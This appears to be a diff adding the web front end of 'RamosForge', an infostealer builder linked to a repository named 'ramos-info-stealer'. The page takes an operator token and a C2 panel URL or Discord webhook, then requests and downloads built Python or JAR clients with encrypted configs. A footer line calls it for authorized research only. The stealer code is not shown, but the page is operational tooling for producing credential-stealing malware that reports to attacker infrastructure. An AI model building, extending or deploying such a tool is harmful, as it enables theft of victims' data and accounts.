@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>RamosForge — Lab Payload Builder</title>
+<style>
+:root{
+  --bg:#07090e; --panel:#0f1420; --panel2:#151c2e; --line:#1e2740;
+  --txt:#e6ecff; --dim:#66748f; --acc:#7c5cff; --acc2:#b06cff;
+  --grn:#2ed573; --red:#ff4757; --cyn:#00d9ff; --warn:#ffa502;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+  background:var(--bg); color:var(--txt);
+  font-family:"JetBrains Mono","Fira Code",ui-monospace,Menlo,Consolas,monospace;
+  min-height:100vh; overflow-x:hidden;
+}
+/* animated backdrop */
+#bg{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+    radial-gradient(900px 500px at 15% -10%, rgba(124,92,255,.14), transparent 60%),
+    radial-gradient(700px 500px at 90% 110%, rgba(0,217,255,.08), transparent 55%);}
+#grid{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35;
+  background-image:linear-gradient(rgba(124,92,255,.05) 1px,transparent 1px),
+                   linear-gradient(90deg,rgba(124,92,255,.05) 1px,transparent 1px);
+  background-size:44px 44px;
+  animation:drift 26s linear infinite;}
+@keyframes drift{to{background-position:44px 44px,44px 44px}}
+.wrap{width:100%;max-width:980px;margin:0 auto;padding:30px 20px 44px;position:relative;z-index:1}
+
+/* entrance animations */
+@keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+.r{opacity:0;animation:rise .6s cubic-bezier(.2,.8,.2,1) forwards}
+
+header{text-align:center;margin-bottom:26px}
+.logo{display:inline-flex;align-items:center;gap:12px;font-size:30px;font-weight:800;letter-spacing:-1px;
+  background:linear-gradient(90deg,#a78bfa,#7c5cff 40%,#00d9ff);
+  -webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+  background-size:200% auto;animation:shine 5s linear infinite}
+@keyframes shine{to{background-position:200% center}}
+.logo svg{width:34px;height:34px;flex:none}
+.hammer{transform-origin:50% 60%;animation:swing 2.4s ease-in-out infinite}
+@keyframes swing{0%,100%{transform:rotate(0)}25%{transform:rotate(-12deg)}60%{transform:rotate(7deg)}}
+.sub{color:var(--dim);margin-top:8px;font-size:13px;display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--grn);box-shadow:0 0 10px var(--grn);animation:pulse 2s infinite}
+@keyframes pulse{50%{opacity:.4}}
+
+.tabs{display:flex;gap:6px;background:var(--panel2);border:1px solid var(--line);border-radius:12px;padding:5px;margin-bottom:20px}
+.tab{flex:1;text-align:center;padding:13px 0;font-size:13px;font-weight:700;color:var(--dim);cursor:pointer;
+  border-radius:8px;transition:color .2s, background .2s, transform .2s;user-select:none;position:relative}
+.tab:hover{color:var(--txt);background:rgba(124,92,255,.08)}
+.tab.active{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;
+  box-shadow:0 4px 18px rgba(124,92,255,.35);transform:translateY(-1px)}
+
+.card{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:22px;margin-bottom:16px;
+  position:relative;overflow:hidden;transition:border .25s, box-shadow .25s}
+.card:hover{border-color:rgba(124,92,255,.45);box-shadow:0 8px 30px rgba(0,0,0,.35)}
+.card::before{content:"";position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--acc),transparent)}
+.card-title{font-size:11px;font-weight:700;color:var(--dim);margin-bottom:14px;text-transform:uppercase;letter-spacing:.8px}
+.card-title b{color:var(--acc2)}
+
+label{display:block;font-size:11px;font-weight:700;color:var(--dim);margin-bottom:7px;text-transform:uppercase;letter-spacing:.5px}
+input[type=text],input[type=password]{width:100%;background:#080b11;border:1px solid var(--line);color:var(--txt);
+  border-radius:10px;padding:13px 15px;font-family:inherit;font-size:13.5px;outline:none;
+  transition:border .2s, box-shadow .2s, background .2s}
+input:focus{border-color:var(--acc);box-shadow:0 0 0 3px rgba(124,92,255,.16);background:#0a0e16}
+input::placeholder{color:#39435c}
+.hint{font-size:11px;color:var(--dim);margin-top:9px;line-height:1.6}
+
+.switch-row{display:flex;align-items:center;margin:18px 0;padding:14px 16px;background:var(--panel2);
+  border-radius:11px;border:1px solid var(--line);transition:border .2s}
+.switch-row:hover{border-color:rgba(124,92,255,.4)}
+.switch-label{display:flex;align-items:center;gap:12px;cursor:pointer;color:var(--txt);font-size:13px;user-select:none}
+.switch-input{appearance:none;width:46px;height:25px;background:var(--line);border-radius:13px;position:relative;transition:.25s;flex:none;cursor:pointer}
+.switch-input::before{content:"";position:absolute;top:2px;left:2px;width:21px;height:21px;background:#fff;border-radius:50%;
+  transition:.25s cubic-bezier(.4,1.4,.5,1);box-shadow:0 2px 6px rgba(0,0,0,.4)}
+.switch-input:checked{background:linear-gradient(135deg,var(--acc),var(--acc2))}
+.switch-input:checked::before{transform:translateX(21px)}
+
+.btn-row{display:flex;gap:10px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 24px;border-radius:11px;font-size:13px;
+  font-weight:700;font-family:inherit;cursor:pointer;border:none;transition:transform .15s, filter .15s, box-shadow .15s, background .15s}
+.btn:active{transform:scale(.96)}
+.btn-primary{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;box-shadow:0 4px 16px rgba(124,92,255,.3)}
+.btn-primary:hover{filter:brightness(1.12);transform:translateY(-2px);box-shadow:0 8px 24px rgba(124,92,255,.45)}
+.btn-ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{background:rgba(124,92,255,.1);border-color:var(--acc);transform:translateY(-2px)}
+.btn:disabled{opacity:.4;cursor:not-allowed;transform:none!important}
+
+.output{margin-top:18px;padding:16px;background:#080b11;border:1px solid var(--line);border-radius:11px;
+  max-height:440px;overflow:auto;font-size:12px;line-height:1.7;white-space:pre-wrap;word-break:break-all;
+  color:var(--dim);transition:border .2s}
+.output:focus{border-color:var(--acc)}
+.output::-webkit-scrollbar{width:9px;height:9px}
+.output::-webkit-scrollbar-thumb{background:var(--line);border-radius:5px}
+.output::-webkit-scrollbar-thumb:hover{background:var(--acc)}
+.output .ok{color:var(--grn)} .output .warn{color:var(--warn)} .output .err{color:var(--red)} .output .info{color:var(--cyn)}
+.output b{color:var(--txt)}
+
+footer{margin-top:30px;text-align:center;color:var(--dim);font-size:11px;line-height:1.9}
+footer .sep{color:var(--line)}
+.gh{display:inline-flex;align-items:center;gap:7px;color:var(--dim);text-decoration:none;font-size:12px;
+  margin-top:8px;padding:8px 16px;border:1px solid var(--line);border-radius:9px;transition:.2s;display:inline-flex}
+.gh:hover{color:var(--txt);border-color:var(--acc);background:rgba(124,92,255,.08);transform:translateY(-1px)}
+
+/* toast */
+#toast{position:fixed;bottom:26px;left:50%;transform:translate(-50%,90px);z-index:50;
+  background:var(--panel2);border:1px solid var(--acc);color:var(--txt);padding:12px 22px;border-radius:11px;
+  font-size:13px;opacity:0;transition:transform .35s cubic-bezier(.2,.9,.3,1.2), opacity .35s;pointer-events:none;
+  box-shadow:0 10px 40px rgba(0,0,0,.5)}
+#toast.show{transform:translate(-50%,0);opacity:1}
+#toast.err{border-color:var(--red)}
+
+@media(max-width:640px){.wrap{padding:18px 14px}.logo{font-size:23px}.card{padding:16px}.btn{flex:1;justify-content:center}}
+</style>
+</head>
+<body>
+<div id="bg"></div><div id="grid"></div>
+<div class="wrap">
+
+<header class="r" style="animation-delay:.05s">
+  <div class="logo">
+    <svg class="hammer" viewBox="0 0 24 24" fill="none" stroke="#b06cff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M14 6l-4-4-3 3 4 4M10 9l-6 6 4 4 6-6M14 6l5 5-3 3-5-5"/>
+    </svg>
+    RamosForge
+  </div>
+  <div class="sub"><span class="dot"></span>lab payload builder — forge · inspect · download</div>
+</header>
+
+<div class="tabs r" style="animation-delay:.15s">
+  <div class="tab active" data-tab="py">PYTHON</div>
+  <div class="tab" data-tab="jar">JAR</div>
+</div>
+
+<div class="card r" style="animation-delay:.25s">
+  <div class="card-title">① operator <b>token</b></div>
+  <input type="password" id="tok" placeholder="FORGE_TOKEN" autocomplete="off">
+  <div class="hint">master = full access · spares = same access, burnable on leak</div>
+</div>
+
+<div class="card r" style="animation-delay:.35s">
+  <div class="card-title">② <b>target</b></div>
+  <label id="tLabel" for="target">C2 URL (https://host:port) or Discord webhook</label>
+  <input type="text" id="target" placeholder="https://your-panel:443  or  https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false">
+  <div class="switch-row">
+    <label class="switch-label">
+      <input type="checkbox" id="enc" class="switch-input" checked>
+      <span>encrypt config — seal target with a per-build random key</span>
+    </label>
+  </div>
+  <div class="btn-row">
+    <button class="btn btn-primary" id="forgeBtn" onclick="forge()">⚒️ FORGE</button>
+    <button class="btn btn-ghost" onclick="viewSrc()">👁 VIEW SRC</button>
+    <button class="btn btn-ghost" id="dlBtn" style="display:none" onclick="download()">⬇ DOWNLOAD</button>
+  </div>
+</div>
+
+<div class="output r" id="out" style="animation-delay:.45s">ready — paste token + target, then forge.</div>
+
+<footer class="r" style="animation-delay:.55s">
+  ephemeral builds · configs die with the request · nothing stored server-side<br>
+  <span class="sep">◆</span> authorized security research only <span class="sep">◆</span><br>
+  <a class="gh" href="https://github.com/zackmsa777-a11y/ramos-info-stealer" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M12 .3a12 12 0 0 0-3.8 23.4c.6.1.8-.3.8-.6v-2.2c-3.3.7-4-1.6-4-1.6-.6-1.4-1.3-1.8-1.3-1.8-1.1-.7 0-.7 0-.7 1.2.1 1.8 1.2 1.8 1.2 1 1.8 2.8 1.3 3.5 1a2.7 2.7 0 0 1 .8-1.7c-2.7-.3-5.5-1.3-5.5-6 0-1.2.5-2.3 1.3-3.1-.2-.4-.6-1.6.1-3.2 0 0 1-.3 3.3 1.2a11.5 11.5 0 0 1 6 0C17.3 4.7 18.3 5 18.3 5c.7 1.6.3 2.8.1 3.2.8.8 1.3 1.9 1.3 3.2 0 4.6-2.8 5.6-5.5 5.9.4.4.8 1.1.8 2.2v3.3c0 .3.2.7.8.6A12 12 0 0 0 12 .3"/></svg>
+    full source · github.com/zackmsa777-a11y/ramos-info-stealer
+  </a>
+</footer>
+
+</div>
+<div id="toast"></div>
+
+<script>
+const $=s=>document.querySelector(s), $$=s=>document.querySelectorAll(s);
+let mode='py', last={src:'',name:''};
+const tok=$('#tok'), target=$('#target'), enc=$('#enc'), out=$('#out'),
+      dlBtn=$('#dlBtn'), tLabel=$('#tLabel'), forgeBtn=$('#forgeBtn'), toast=$('#toast');
+const H=()=>({'Content-Type':'application/json','X-Forge-Token':tok.value.trim()});
+
+function toastSay(msg,err){
+  toast.textContent=msg; toast.className=err?'show err':'show';
+  clearTimeout(toast._t); toast._t=setTimeout(()=>toast.className='',2600);
+}
+function say(s,c=''){out.innerHTML='<span class="'+c+'">'+s+'</span>';}
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+$$('.tab').forEach(b=>b.onclick=()=>{
+  mode=b.dataset.tab;
+  $$('.tab').forEach(x=>x.classList.toggle('active',x===b));
+  if(mode==='py'){
+    target.placeholder='https://your-panel:443  or  https://discord.com/api/webhooks/...';
+    tLabel.textContent='C2 URL (https://host:port) or Discord webhook';
+  }else{
+    target.placeholder='https://your-panel:3000';
+    tLabel.textContent='Panel URL for mod check-in (https://host:port)';
+  }
+  toastSay(mode==='py'?'PYTHON mode':'JAR mode');
+});
+
+async function forge(){
+  if(!tok.value.trim()){say('⚠ enter your operator token first','err');toastSay('token required',1);return;}
+  if(!target.value.trim()){say('⚠ enter a target first','err');toastSay('target required',1);return;}
+  dlBtn.style.display='none'; last={src:'',name:''};
+  forgeBtn.disabled=true; forgeBtn.textContent='⚒️ FORGING…';
+  say('forging '+(mode==='py'?'python':'jar')+'…','info');
+  const v=target.value.trim();
+  const body={encrypt:enc.checked};
+  // auto-detect: discord webhook vs C2 panel url
+  if(/discord\.com\/api\/webhooks\//.test(v)) body.webhook=v; else body.c2=v;
+  try{
+    const r=await fetch('/build/'+mode,{method:'POST',headers:H(),body:JSON.stringify(body)});
+    if(mode==='jar'){
+      if(!r.ok){let m='jar build failed';try{const d=await r.json();m=d.error||m;}catch(e){}
+        say('✖ '+m,'err');toastSay(m,1);return;}
+      const blob=await r.blob();
+      const a=document.createElement('a');
+      a.href=URL.createObjectURL(blob); a.download='blackhole-client.jar'; a.click();
+      say('✔ jar forged — download started · '+(enc.checked?'config sealed':'config plaintext')+' · '+blob.size+' bytes','ok');
+      toastSay('jar forged · '+blob.size+' bytes');
+      return;
+    }
+    if(!r.ok){let m='build failed ('+r.status+')';try{const e=await r.json();m=e.error||e.description||m;}catch(_){}
+      say('✖ '+m+' — check the target field','err');toastSay(m,1);return;}
+    const d=await r.json();
+    if(d.src){
+      last={src:d.src,name:'client.py'};
+      say('✔ forged <b>'+d.bytes+'</b> bytes · encrypted=<b>'+d.encrypted+'</b> · '+(d.key_note||'plaintext')
+       +'\n\nsrc below — VIEW SRC re-shows it, DOWNLOAD saves it.','ok');
+      out.textContent=d.src;
+      dlBtn.style.display='inline-flex';
+      toastSay('forged '+d.bytes+' bytes');
+    }else{say('✖ error: '+esc(JSON.stringify(d)),'err');toastSay('build failed',1);}
+  }catch(e){say('✖ network error: '+esc(e),'err');toastSay('network error',1);}
+  finally{forgeBtn.disabled=false; forgeBtn.textContent='⚒️ FORGE';}
+}
+
+async function viewSrc(){
+  if(mode==='py'&&last.src){out.textContent=last.src;toastSay('showing forged src');return;}
+  if(!tok.value.trim()){say('⚠ enter your operator token first','err');toastSay('token required',1);return;}
+  say('fetching '+(mode==='py'?'python template':'mod sources')+'…','info');
+  try{
+    const r=await fetch('/src?which='+mode,{headers:{'X-Forge-Token':tok.value.trim()}});
+    if(!r.ok){say('✖ '+(r.status===403?'token rejected':'no source'),'err');toastSay(r.status===403?'token rejected':'no source',1);return;}
+    const d=await r.json();
+    if(d.src){out.textContent=d.src;toastSay((mode==='py'?'client template':'mod sources')+' · '+d.src.length+' bytes');}
+    else out.textContent='n/a';
+  }catch(e){out.textContent='error: '+e;toastSay('fetch failed',1);}
+}
+
+function download(){
+  if(!last.src){say('⚠ forge first','err');toastSay('forge first',1);return;}
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([last.src],{type:'text/x-python'}));
+  a.download=last.name; a.click();
+  toastSay('downloaded '+last.name);
+}
+</script>
+</body>
+</html>
